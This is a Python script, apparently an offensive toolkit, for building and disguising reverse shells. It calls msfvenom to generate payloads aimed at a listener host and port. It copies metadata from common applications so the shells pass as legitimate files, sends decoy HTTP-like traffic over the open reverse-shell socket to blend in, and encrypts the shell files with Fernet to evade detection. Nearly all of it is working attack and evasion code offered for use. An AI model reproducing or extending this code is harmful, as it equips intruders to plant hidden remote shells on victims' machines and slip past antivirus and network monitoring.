import subprocess
import os
import shutil
import base64
from cryptography.fernet import Fernet
import random
import time
import stat

SHELLS_DIR = "generated_shells"
if not os.path.exists(SHELLS_DIR):
    os.makedirs(SHELLS_DIR)
    print(f"[INFO] Created directory for shells: {SHELLS_DIR}")


# Function: Generate Shell
def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
    output_path = os.path.join(SHELLS_DIR, output_name)
    try:
        print(f"[INFO] Generating shell with payload: {payload}")
        command = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", output_format,
            "-o", output_path,
        ]
        subprocess.run(command, check=True)
        print(f"[SUCCESS] Shell generated: {output_path}")
        return output_path
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to generate shell: {e}")
        return None


# Function: Mimic Common Applications
def mimic_application(file_path, common_app_path):
    """
    Modify the generated shell to mimic a common application.
    
    :param file_path: Path to the generated shell.
    :param common_app_path: Path to a common application to mimic.
    """
    try:
        # Copy file attributes
        shutil.copystat(common_app_path, file_path)
        print(f"[INFO] Mimicked attributes of {common_app_path} for {file_path}")
    except Exception as e:
        print(f"[ERROR] Failed to mimic application attributes: {e}")


# Function: Send False Positive Data
def send_false_positive_traffic(socket, decoy_data, frequency=5):
    """
    Send false positive traffic during the reverse shell session.

    :param socket: Active socket connection for reverse shell.
    :param decoy_data: List of benign data strings to send.
    :param frequency: Frequency in seconds to send decoy traffic.
    """
    try:
        while True:
            decoy_message = random.choice(decoy_data)
            socket.sendall(decoy_message.encode("utf-8"))
            print(f"[INFO] Sent decoy data: {decoy_message}")
            time.sleep(frequency)
    except Exception as e:
        print(f"[ERROR] Failed to send false positive traffic: {e}")


# Function: Copy File Metadata
def copy_file_attributes(source_path, target_path):
    """
    Copy metadata such as creation date, modification date, and permissions from one file to another.

    :param source_path: Path to the source file.
    :param target_path: Path to the target file.
    """
    try:
        shutil.copystat(source_path, target_path)
        print(f"[INFO] Copied file attributes from {source_path} to {target_path}")
    except Exception as e:
        print(f"[ERROR] Failed to copy file attributes: {e}")


# Example Function: Generate Decoy Traffic for Reverse Shell
def example_decoy_traffic():
    return [
        "GET /index.html HTTP/1.1",
        "POST /api/login HTTP/1.1",
        "200 OK",
        "<html><body>Sample traffic</body></html>",
    ]


# Encryption Functions (Unchanged)
def encrypt_shell(shell_path, encryption_key):
    if not os.path.exists(shell_path):
        print(f"[ERROR] Shell file not found: {shell_path}")
        return None

    encrypted_path = f"{shell_path}.enc"
    try:
        with open(shell_path, "rb") as shell_file:
            shell_data = shell_file.read()

        fernet = Fernet(encryption_key)
        encrypted_data = fernet.encrypt(shell_data)

        with open(encrypted_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        print(f"[SUCCESS] Encrypted shell saved to: {encrypted_path}")
        return encrypted_path
    except Exception as e:
        print(f"[ERROR] Failed to encrypt shell: {e}")
        return None


def generate_encryption_key():
    key = Fernet.generate_key()
    print(f"[INFO] Encryption key generated: {key.decode()}")
    return key
